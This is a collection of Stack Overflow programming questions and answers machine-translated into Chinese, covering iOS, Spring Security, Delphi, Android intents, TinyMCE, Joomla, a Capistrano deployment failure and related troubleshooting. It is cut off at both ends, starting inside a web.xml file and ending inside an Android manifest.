            <param-name>com.sun.jersey.config.property.packages</param-name>
            <param-value>my packages</param-value>
        </init-param>
        <init-param>
            <param-name>com.sun.jersey.spi.container.ContainerRequestFilters</param-name>
            <param-value>com.sun.jersey.api.container.filter.LoggingFilter</param-value>
        </init-param>
        <init-param>
            <param-name>com.sun.jersey.spi.container.ContainerResponseFilters</param-name>
            <param-value>com.sun.jersey.api.container.filter.LoggingFilter</param-value>
        </init-param>
        <init-param>
            <param-name>com.sun.jersey.config.property.JSPTemplatesBasePath</param-name>
            <param-value>/WEB-INF/jsp/*.jsp</param-value>
        </init-param>
        <init-param>
            <param-name>com.sun.jersey.config.property.WebPageContentRegex</param-name>
            <param-value>/resources/*.html </param-value>
        </init-param>
    </servlet>
    <servlet-mapping>
        <servlet-name>REST</servlet-name>
        <url-pattern>/resources/*</url-pattern>
    </servlet-mapping>

</webapp> 
```

# ios - 用于管理视图控制器流的类模式

> ID：13841956
> 
> 赞同：4
> 
> 时间：2012-12-12T14:34:19.970
> 
> 标签：ios, design-patterns, uinavigationcontroller

目前我正在使用单例类来做一些工作，但我想知道是否有更好的东西。

我有一个具有完全动态工作流程的应用程序。它使用导航控制器，但视图控制器的顺序完全取决于从我们的服务器下载的一些数据。

整个工作流程被下载并保存在一个数组中。

应用程序的“主菜单”屏幕有几个选项（设置、最近等），这些选项是固定的，但其中之一是动态选项。它总是以相同类型的视图控制器开始，但从那时起它取决于您选择的内容。

**描述**

这些动态控制器有 4 种不同类型。

*   具有单一选择和详细指标的表视图控制器。
*   具有多项选择和复选标记的表视图控制器。
*   带有文本字段和键盘的视图控制器。
*   用于在服务器上搜索帐户的视图控制器（以及其他相关的 VC）。

当您按下主菜单上的“新事件”选项时，菜单会转到单例 (EventManager) 并告诉它开始一个新事件。

然后单例将单个选择动态视图推送到导航控制器上并为其提供初始选项。

从这里开始，单例选择所有的选择并计算出接下来需要什么类型的视图。

**我希望这是有道理的**

无论如何，我不喜欢这里的单例模式，因为我认为它不应该是单例。

我想要的是一个可以从 ViewController 创建的类，然后该类将控制不同视图控制器负载之间的数据推送和弹出以及数据流。然后当你回到主菜单时，这个类可以消失，所以我每次都创建一个新类。

有没有我可以看到的模式可以做到这一点？还是我应该像现在这样坚持单身？

我希望这是有道理的。

**编辑**

我可以为此使用 UIPageViewController 吗？然后 UIPageViewController 的数据源/委托对象将取代我目前正在使用的单例......还是什么？

**从推特请求中添加照片**

![在此处输入图像描述](../Images/a61f47f20ea0a57c29bb5314d37eb50f.png)

流程中的每个 VC 都不知道它之前的凸轮或接下来的凸轮。他们所做的只是回调单身人士说“选择了这个值”或“输入了这个文本”等......

然后单例存储该信息并计算出接下来会发生什么并将下一个 VC 推入堆栈。

它需要能够沿堆栈向后移动，以便用户可以返回更改某些内容等...

一切正常，我只是不喜欢使用单例。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:40:47.277

*这里有很多评论，按重要性排序。*

你在这里描述的一切听起来都很好，甚至是命名。“EventManager”听起来像是管理系统中的所有“事件”（所以我希望有一个名为 的类`Event`，但这是一个小问题，名字可能仍然很好）。还有其他好的设计，但我对你的没有任何问题。

我同意这看起来确实很适合`UIPageViewController`. 你当然应该调查一下，看看它是否合适。如果可以的话，使用内置控制器总是很好的。

没有理由强烈避免单例。它们是 iOS 开发的自然组成部分，在良好的 Cocoa 设计中相当普遍。它们通常应该是[“共享”单例](http://iosptl.com/posts/the-singleton-pattern/)（永远不要创建覆盖的“严格”单例`+allocWithZone:`）。这只是创建了一个易于访问的实例，而不是真正的“单例”。这就是事情的`NSNotificationCenter`工作方式，通常是一个非常好的模式。

当系统的许多随机部分需要直接访问它们并且将它们传递给每个人将是很多开销时，单例是最好的（特别是如果您必须传递对象的许多部分自己不需要它） . 再想想`NSNotificationCenter`。如果它的用户大多是连续的（即大多数对象你会传递它以实际需要它），那么只需在程序开始时创建一个并传递它。这听起来像你的情况，所以你对它的直觉似乎很好。只需将其取消单例并通过即可。容易改变。

但我肯定会深入研究`UIPageViewController`。它可以很好地匹配您的问题。

# java - 添加第二个 url 拦截时 Spring 安全性不起作用

> ID：13841957
> 
> 赞同：0
> 
> 时间：2012-12-12T14:34:24.333
> 
> 标签：java, spring, spring-security

SS 一直运行良好，直到我添加了第二个 url 拦截，如下所示：

```
<security:intercept-url pattern="/index*" access="ROLE_USER,ROLE_ADMIN" /> <!-- new one-->
<security:intercept-url pattern="/*.htm" access="ROLE_USER,ROLE_ADMIN" /> 
```

用户名和密码工作正常，我浏览了提供程序管理器类中的调试器，看到用户正在从数据库中正确检索，等等，但不确定为什么当角色与其他 url 模式相同时访问被拒绝。它们现在都不起作用，当我删除第一个模式时，* .htm 再次开始工作，非常混乱。

```
12 Dec 2012 09:28:16 - DEBUG - org.springframework.security.web.util.AntPathRequestMatcher - Checking match of request : '/index.jsp'; against '/index*'
12 Dec 2012 09:28:16 - DEBUG - org.springframework.security.web.access.intercept.FilterSecurityInterceptor - Secure object: FilterInvocation: URL: /index.jsp; Attributes: [ROLE_USER, ROLE_ADMIN]
12 Dec 2012 09:28:16 - DEBUG - org.springframework.security.web.access.intercept.FilterSecurityInterceptor - Previously Authenticated: org.springframework.security.authentication.AnonymousAuthenticationToken@9055c2bc: Principal: anonymousUser; Credentials: [PROTECTED]; Authenticated: true; Details: org.springframework.security.web.authentication.WebAuthenticationDetails@b364: RemoteIpAddress: 0:0:0:0:0:0:0:1; SessionId: null; Granted Authorities: ROLE_ANONYMOUS
12 Dec 2012 09:28:16 - DEBUG - org.springframework.security.access.vote.AffirmativeBased - Voter: org.springframework.security.access.vote.RoleVoter@8ca9a2d, returned: -1
12 Dec 2012 09:28:16 - DEBUG - org.springframework.security.access.vote.AffirmativeBased - Voter: org.springframework.security.access.vote.AuthenticatedVoter@2d5004dd, returned: 0
12 Dec 2012 09:28:16 - DEBUG - org.springframework.web.context.support.XmlWebApplicationContext - Publishing event in Root WebApplicationContext: org.springframework.security.access.event.AuthorizationFailureEvent[source=FilterInvocation: URL: /index.jsp]
12 Dec 2012 09:28:16 - DEBUG - org.springframework.security.web.access.ExceptionTranslationFilter - Access is denied (user is anonymous); redirecting to authentication entry point
org.springframework.security.access.AccessDeniedException: Access is denied
    at org.springframework.security.access.vote.AffirmativeBased.decide(AffirmativeBased.java:83)
    at org.springframework.security.access.intercept.AbstractSecurityInterceptor.beforeInvocation(AbstractSecurityInterceptor.java:206)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:84)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:103)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:113)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:45)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilter(BasicAuthenticationFilter.java:150)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter.doFilter(DefaultLoginPageGeneratingFilter.java:91)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:183)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:192)
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:160)
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:525)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:128)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:568)
    at org.apache.catalina.authenticator.SingleSignOn.invoke(SingleSignOn.java:394)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:286)
    at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:845)
    at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:583)
    at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:447)
    at java.lang.Thread.run(Unknown Source) 
```

**编辑**
现在不起作用的是 spring-security 在身份验证后没有重定向到访问的页面，在这种情况下为`index.jsp`.

**编辑**
Spring Security 配置：

```
<beans xmlns="http://www.springframework.org/schema/beans" 
    xmlns:security="http://www.springframework.org/schema/security"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.springframework.org/schema/beans 
                    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
                    http://www.springframework.org/schema/security 
                    http://www.springframework.org/schema/security/spring-security-3.1.xsd">
    <security:http auto-config="true" create-session="never">
        <!-- security:intercept-url pattern="/index*" access="ROLE_USER,ROLE_ADMIN" /-->
        <security:intercept-url pattern="/*.htm" access="ROLE_USER,ROLE_ADMIN" />
        <security:logout logout-url="/logout.htm" logout-success-url="/" />
    </security:http>

    <bean id="daoAuthenticationProvider"
        class="org.springframework.security.authentication.dao.DaoAuthenticationProvider">
        <property name="userDetailsService" ref="userService" />
    </bean>

    <bean id="authenticationManager"
        class="org.springframework.security.authentication.ProviderManager">
        <property name="providers">
            <list>
                <ref local="daoAuthenticationProvider" />
            </list>
        </property>
    </bean>

    <security:authentication-manager>
        <security:authentication-provider user-service-ref="userService">
            <security:password-encoder hash="md5" />
        </security:authentication-provider>
    </security:authentication-manager>

</beans> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T20:48:39.803

与我在上面的评论中写的相反，问题的根本原因是将`create-session`属性设置为`never`bean `security:http`。`Spring`在创建会话失败后强制应用程序使用匿名用户。我去掉了属性，又高兴了。

# delphi - 在delphi中将十六进制str转换为十进制值

> ID：13841972
> 
> 赞同：10
> 
> 时间：2012-12-12T14:34:48.683
> 
> 标签：delphi, hex, decimal, delphi-6, valueconverter

我在用 Delphi 将十六进制值的字符串表示形式转换为整数值时遇到了问题。

例如：

> 当我使用该功能时，$FC75B6A9D025CB16 给我 802829546：

```
Abs(StrToInt64('$FC75B6A9D025CB16')) 
```

但如果我使用 Windows 的 calc 程序，结果是：18191647110290852630

所以我的问题是：谁是对的？我，还是计算？

有人已经有这种问题了吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-12T14:56:23.000

事实上`802829546`这里显然是错误的。

Calc 返回一个 64 位无符号值 ( `18191647110290852630d`)。

Delphi Int64 类型使用最高位作为符号：

```
Int := StrToInt64('$FC75B6A9D025CB16');
Showmessage(IntToStr(Int)); 
```

返回`-255096963418698986`正确的值

如果您需要使用大于 64 位有符号的值，请[在此处查看 Arnaud 的答案](https://stackoverflow.com/a/11811666/800214)。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-12T14:37:43.823

该数字太大而无法表示为带符号的 64 位数字。

```
FC75B6A9D025CB16h = 18191647110290852630d 
```

最大可能的有符号 64 位值是

```
2^63 - 1 = 9223372036854775807 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-12T14:44:19.540

要处理大数字，您需要用于 delphi 的外部库

[Pascal (Delphi) 中的大数](https://stackoverflow.com/questions/3590171/large-numbers-in-pascal-delphi)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-13T14:48:24.900

我不得不使用一个名为“DFF Library”的 Delphi 库，因为我在 Delphi6 上工作，并且`Uint64`此版本中不存在该类型。
[主页](http://www.delphiforfun.org/programs/Library/big_integers.htm)

这是我将十六进制值字符串转换为十进制值字符串的代码：

您需要添加`UBigIntsV3`到您的单位中的用途。

```
function StrHexaToUInt64Str(const stringHexadecimal: String): string;
var
  unBigInteger:TInteger;
begin
  unBigInteger:=TInteger.Create;
  try
    // stringHexadecimal parameter is passed without the '$' symbol
    // ex: stringHexadecimal:='FFAA0256' and not '$FFAA0256'
    unBigInteger.AssignHex(stringHexadecimal);
    //the boolean value determine if we want to add the thousand separator or not.
    Result:=unBigInteger.converttoDecimalString(false);
  finally
    unBigInteger.free;
  end;
end; 
```

# android - Android中的自定义隐式意图不起作用

> ID：13841976
> 
> 赞同：4
> 
> 时间：2012-12-12T14:34:53.513
> 
> 标签：android, android-intent, implicit

我正在测试隐含的意图。我有两个小型测试应用程序：第一个 AndroidManifest.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.sudipta.example"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk android:minSdkVersion="14" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >
        <activity
            android:label="@string/app_name"
            android:name="com.sudipta.example.Intent1Activity" >
            <intent-filter >
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <intent-filter >
                <action  android:name="com.sudipta.personal.TEST" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="text/plain"/>
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

第二个AndroidManifest.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.sudipta.example"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk android:minSdkVersion="14" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >
        <activity
            android:label="@string/app_name"
            android:name=".Intent2Activity" >
            <intent-filter >
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <intent-filter >
                <action  android:name="com.sudipta.personal.TEST" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="text/plain"/>
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

现在我正在调用以下代码：

```
btn1.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                //Call the Implicit Intent
                Intent intent = new Intent();
                intent.setAction("com.sudipta.personal.TEST");
                startActivity(intent);                      
            }
        }); 
```

以下是我得到的错误代码：

```
12-12 15:20:42.963: E/AndroidRuntime(824): FATAL EXCEPTION: main
12-12 15:20:42.963: E/AndroidRuntime(824): android.content.ActivityNotFoundException: No Activity found to handle Intent { act=com.sudipta.personal.TEST }
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.app.Instrumentation.checkStartActivityResult(Instrumentation.java:1512)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.app.Instrumentation.execStartActivity(Instrumentation.java:1384)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.app.Activity.startActivityForResult(Activity.java:3190)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.app.Activity.startActivity(Activity.java:3297)
12-12 15:20:42.963: E/AndroidRuntime(824):  at com.sudipta.example.ImplicitIntentActivity$1.onClick(ImplicitIntentActivity.java:28)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.view.View.performClick(View.java:3460)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.view.View$PerformClick.run(View.java:13955)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.os.Handler.handleCallback(Handler.java:605)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.os.Handler.dispatchMessage(Handler.java:92)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.os.Looper.loop(Looper.java:137)
12-12 15:20:42.963: E/AndroidRuntime(824):  at android.app.ActivityThread.main(ActivityThread.java:4340)
12-12 15:20:42.963: E/AndroidRuntime(824):  at java.lang.reflect.Method.invokeNative(Native Method)
12-12 15:20:42.963: E/AndroidRuntime(824):  at java.lang.reflect.Method.invoke(Method.java:511)
12-12 15:20:42.963: E/AndroidRuntime(824):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
12-12 15:20:42.963: E/AndroidRuntime(824):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
12-12 15:20:42.963: E/AndroidRuntime(824):  at dalvik.system.NativeStart.main(Native Method) 
```

你能告诉我这里有什么问题吗？谢谢。

忏悔录。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-06-30T09:23:18.157

尝试从您尝试启动的活动中删除 android:label。也许它无法访问 app_name 字符串

# tinymce - tinymce 自动添加 p 标签？

> ID：13841986
> 
> 赞同：47
> 
> 时间：2012-12-12T14:35:30.093
> 
> 标签：tinymce

我使用 tinymce 并将其保存到数据库中。

当我使用 tinymce 编辑保存的内容并再次保存时，它会在开头插入 ap 标签。

一遍又一遍地编辑内容会在内容的开头留下很大的空白。

有人知道解决办法吗？

* * *

## 回答 #1

> 赞同：103
> 
> 时间：2012-12-12T14:42:08.337

TinyMce 自动`<p>`在新行中添加“”。您可以像这样在 tinyMce 初始化中设置此选项：

```
 tinyMCE.init({
      mode : "textareas",
      theme : "advanced",
      force_br_newlines : false,
      force_p_newlines : false,
      forced_root_block : '',
  }); 
```

希望它会有所帮助

丰斯基

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-10-28T11:32:58.177

对我来说，它通过制作“force_br_newlines：true”而不是false来起作用。

```
 tinyMCE.init({
      mode : "textareas",
      theme : "advanced",
      force_br_newlines : true,
      force_p_newlines : false,
      forced_root_block : ''
  }); 
```

*我希望它有帮助*

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-02-23T00:45:05.440

我确信@Fonski 的答案是正确的，但我想我会为其他对代码放在哪里感到困惑的人更新这个。我将以下内容放在我的`_config.php`文件中以使其正常工作：

```
$defaultEditorConfig = HtmlEditorConfig::get('cms');
$defaultEditorConfig->setOptions(
    array(
        'mode'              => 'textareas',
        'theme'             => 'advanced',
        'force_br_newlines' => false,
        'force_p_newlines'  => false,
        'forced_root_block' => ''
    )
); 
```

注意：如果您只想删除自动包装图像标签（等）的 p 标签，您需要设置的只是`'forced_root_block' => ''`选项。

编辑：此建议适用于使用 SilverStripe 的人，我发布此建议认为问题是 SilverStripe 特定的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-08-18T19:14:26.857

从 tinymce.js v4.1.10 代码：

```
newBlockName = (settings.force_p_newlines ? 'p' : '') || settings.forced_root_block; 
```

所以避免 <p> 的关键似乎如前所述

```
settings.force_p_newlines = false 
```

和

```
settings.forced_root_block = '' 
```

# joomla - 选择框中的图像

> ID：13841987
> 
> 赞同：0
> 
> 时间：2012-12-12T14:35:31.740
> 
> 标签：joomla, joomla2.5

我已经修改了 joomla 中的 mod_language 以放置一个带有图像和文本的选择框。

但我只能放文字而没有图像。

我尝试包含这样的图像..

```
<?php foreach($list as $language):?>
<?php if ($language->image == 'en') :?>
    <option dir=<?php echo JLanguage::getInstance($language->lang_code)->isRTL() ? '"rtl"' : '"ltr"'?> value="<?php echo $language->link;?>" <?php echo $language->active ? 'selected="selected"' : ''?>>
            <img alt="icon rss" src="images/footer/idioma_espanol.png" /> Change Language
    </option>
<?php else :?>
    <option dir=<?php echo JLanguage::getInstance($language->lang_code)->isRTL() ? '"rtl"' : '"ltr"'?> value="<?php echo $language->link;?>" <?php echo $language->active ? 'selected="selected"' : ''?>>
            <img alt="icon rss" src="images/footer/idioma_espanol.png" /> Cambiar Idioma
    </option>
<?php endif; ?> 
```

还有这个

```
 JHtml::_('image', 'mod_languages/'.$language->image.'.gif'); 
```

但在这两种情况下我都没有获得图像

任何的想法！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T15:55:37.353

尝试使用以下方法获取图像：

```
<img alt="icon rss" src="<?php JURI::root(); ?>templates/yourtemplate/images/idioma_espanol.png" /> 
```

或者如果图像位于组件文件夹中，请使用以下内容：

```
<img alt="icon rss" src="<?php JURI::root(); ?>component/com_yourcomponent/images/idioma_espanol.png" /> 
```

希望这可以帮助

# capistrano - Gitolite 和 Capistrano 部署失败

> ID：13841988
> 
> 赞同：1
> 
> 时间：2012-12-12T14:35:37.403
> 
> 标签：capistrano, gitolite

在一个项目中，我使用 gitolite 和 capistrano。这对另一个开发人员来说很好。问题是它对我不起作用：我实际上无法使用 capistrano 进行部署。

当我运行 cap deploy 命令时，它会询问我服务器的密码（这里，ok）和 gitolite 的密码，它不存在。

```
C:\wamp\www\miiaou>cap deploy
  * ←[32m2012-12-12 15:12:34 executing `deploy'←[0m
  * ←[32m2012-12-12 15:12:34 executing `deploy:update'←[0m
 ** transaction: start
  * ←[32m2012-12-12 15:12:34 executing `deploy:update_code'←[0m
    updating the cached checkout on all servers
    ←[33mexecuting locally: "git ls-remote gitolite@miiaou.fr:miiaou master"←[0m

    ←[2;37mcommand finished in 1351ms←[0m
  * ←[33mexecuting "if [ -d /home/miiaou/miiaou_prod/shared/cached-copy ]; then
cd /home/miiaou/miiaou_prod/shared/cached-copy && git fetch -q origin && git fet
ch --tags -q origin && git reset -q --hard 117b2bb34817d89a1fbe34f1891ac3c823a23
fce && git clean -q -d -x -f; else git clone -q gitolite@miiaou.fr:miiaou /home/
miiaou/miiaou_prod/shared/cached-copy && cd /home/miiaou/miiaou_prod/shared/cach
ed-copy && git checkout -q -b deploy 117b2bb34817d89a1fbe34f1891ac3c823a23fce; f
i"←[0m
    servers: ["miiaou.fr"]
Password:
    [miiaou.fr] executing command
 ** [miiaou.fr :: out] Error reading response length from authentication socket.

 ** [miiaou.fr :: out] gitolite@miiaou.fr's password:
Password:
 ** [miiaou.fr :: out]
 ** ←[31m[miiaou.fr :: out] Permission denied, please try again.
 ** gitolite@miiaou.fr's password:←[0m
Password:
 ** [miiaou.fr :: out]
 ** ←[31m[miiaou.fr :: out] Permission denied (publickey,password).
 ** fatal: The remote end hung up unexpectedly←[0m
    ←[2;37mcommand finished in 36755ms←[0m
*** [←[34mdeploy:update_code←[0m] ←[34mrolling back←[0m
  * ←[33mexecuting "rm -rf /home/miiaou/miiaou_prod/releases/20121212141318; tru
e"←[0m
    servers: ["miiaou.fr"]
    [miiaou.fr] executing command
    ←[2;37mcommand finished in 133ms←[0m
failed: "if [ -d /home/miiaou/miiaou_prod/shared/cached-copy ]; then cd /home/mi
iaou/miiaou_prod/shared/cached-copy && git fetch -q origin && git fetch --tags -
q origin && git reset -q --hard 117b2bb34817d89a1fbe34f1891ac3c823a23fce && git
clean -q -d -x -f; else git clone -q gitolite@miiaou.fr:miiaou /home/miiaou/miia
ou_prod/shared/cached-copy && cd /home/miiaou/miiaou_prod/shared/cached-copy &&
git checkout -q -b deploy 117b2bb34817d89a1fbe34f1891ac3c823a23fce; fi" on miiao
u.fr 
```

我不明白为什么它需要密码，因为 ssh 密钥有效。

有谁能够帮我？谢谢

编辑：如果有帮助，这里是我的 deploy.rb

```
require "bundler/capistrano"

# Rails 3.1 : laod capistrano task to precompile assets
# bundle exec rake RAILS_ENV=staging RAILS_GROUPS=assets assets:precompile
load "deploy/assets"

set :stages, %w(production)
set :default_stage, "production"

set :application, "miiaou"
set :repository,  "gitolite@miiaou.fr:#{application}"
set :domain, "miiaou.fr"

# If you aren't deploying to /u/apps/#{application} on the target
# servers (which is the default), you can specify the actual location
# via the :deploy_to variable:
set :deploy_to, "/home/miiaou/#{application}_prod"
set :shared_path, "/home/miiaou/#{application}_prod/shared"

set :scm, "git"
set :branch, "master"
# Agent Forwarding : use local keys for git
ssh_options[:forward_agent] = true
set :deploy_via, :remote_cache

default_run_options[:pty] = true
ssh_options[:paranoid] = false

set :user, "root"
set :runner, "root"
set :use_sudo, false

role :web, domain                        # Your HTTP server, Apache/etc
role :app, domain                        # This may be the same as your `Web` server
role :db,  domain, :primary => true      # This is where Rails migrations will run

# Add RVM's lib directory to the load path.
#$:.unshift(File.expand_path('./lib', ENV['rvm_path']))
#require "rvm/capistrano"
#set :rvm_ruby_string, '1.9.2'

task :clean_assets, :roles => :app do
  run "rm -rf #{shared_path}/assets/*"
end

task :more_symlinks, :roles => :app do
  # linkage des fichiers de config
  %w(database).each do |config_file|
    run "ln -nfs #{shared_path}/config/#{config_file}.yml #{release_path}/config/#{config_file}.yml"
  end
  run "ln -nfs #{shared_path}/assets #{release_path}/public/assets"
end

task :restart_daemons, :roles => :app do
  #run "cd #{release_path} && bundle exec whenever --set 'environment=#{rails_env}' --update-crontab"
  #run "cd #{release_path} && RAILS_ENV=#{rails_env} ruby script/delayed_job restart"
end

# If you are using Passenger mod_rails uncomment this:
namespace :deploy do
  task :start do ; end
  task :stop do ; end
  task :restart, :roles => :app, :except => { :no_release => true } do
    run "#{try_sudo} touch #{File.join(current_path,'tmp','restart.txt')}"
  end
end

before :'deploy:assets:precompile', :more_symlinks 
```

# objective-c - 如何存储和处理一个大的单词表？

> ID：13841989
> 
> 赞同：0
> 
> 时间：2012-12-12T14:35:41.967
> 
> 标签：objective-c, ios

我有一个 .txt 文件，里面有 200k+ 字。我将使用这个文件来检查一个特定的单词是否存在。存储它以便我可以快速阅读它的最佳方法是什么，我不会更改刚刚从中读取的文件的内容。

我猜将它放在 .txt 文件中然后将其保存到某种数组中并不是很好。我听说过一些关于数据库的事情是这样的吗？我只需要指出正确的方向。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:40:41.123

您是否尝试将其加载到内存中？它可能没那么糟糕。通过将其加载到内存中，我的意思是将其放入`NSArray`您已经建议的内容中。

另一种方法可能是数据库。SQLite 是在 iOS 上的方式。（或Core Data，但这对你的问题来说有点过分了）我不打算解释如何使用SQLite，因为互联网上有很多教程可以找到:)

# facebook - 在 kiosk 上使用 connect with facebook，kiosk IP 会被禁止吗？

> ID：13841992
> 
> 赞同：0
> 
> 时间：2012-12-12T14:35:50.330
> 
> 标签：facebook, kiosk

我们将在一个关于信息亭的会议上运行一个网络游戏。

我们将在自助服务终端上使用 Facebook 连接进行注册。我们将在他们玩游戏后注销已连接的用户。

我们想知道信息亭的 IP 是否会被禁止 - 因为多个用户将在短时间内在同一个信息亭上使用连接 facebook 功能。

任何人都可以验证这种用法是否没有问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T16:02:57.400

除非您期望在很短的时间内大量注册，否则您应该没问题。真的，人类行动很难触发这样的事情，它几乎总是由机器人在短时间内做大量的事情，或者在很长一段时间内持续做少量事情。

# java - andengine 从菜单开始游戏

> ID：13841995
> 
> 赞同：0
> 
> 时间：2012-12-12T14:36:00.330
> 
> 标签：java, android, andengine

我想从菜单开始游戏。在 Eclipse 中，我有 2 个项目，一个带有菜单，另一个是实际游戏。两者都`SimpleBaseGameActivity`用作他们的基础。网上的例子如下所示。特别是，它创建一个意图并使用该意图启动一个活动。下面的代码给出了一个`NoClassDefFoundError`on `MyGame.class`。这并不奇怪，因为`MyGame.class`不存在，而是存在`MyGame.apk`。我该怎么做呢？

```
public boolean onMenuItemClicked(final MenuScene pMenuScene,
        final IMenuItem pMenuItem,
        final float pMenuItemLocalX,
        final float pMenuItemLocalY) {

    switch(pMenuItem.getID()) {
        case MENU_PLAY:
        MainActivity.this.runOnUiThread(new Runnable() {
            public void run() {
                Intent intent = new Intent(getApplication(), MyGame.class);
                startActivity(intent);
                finish();       
            }
        });
        return true;
    }
} 
```

- - - 编辑

我已经让它工作了，所有东西都在一个项目中，当`menu item`点击时，游戏就开始了。但是，当单击“后退箭头”时，它不会返回到`menu`，而是返回到操作系统。文件中的活动定义`manifest`如下。这看起来正确吗？

```
<activity
    android:name=".MainActivity"
    android:label="@string/title_activity_main" >
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />

        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>

<activity
    android:name="com.mygame.MyGame"
    android:label="@string/mygame_activity"
    android:parentActivityName="com.menu.MainActivity" >
    <meta-data
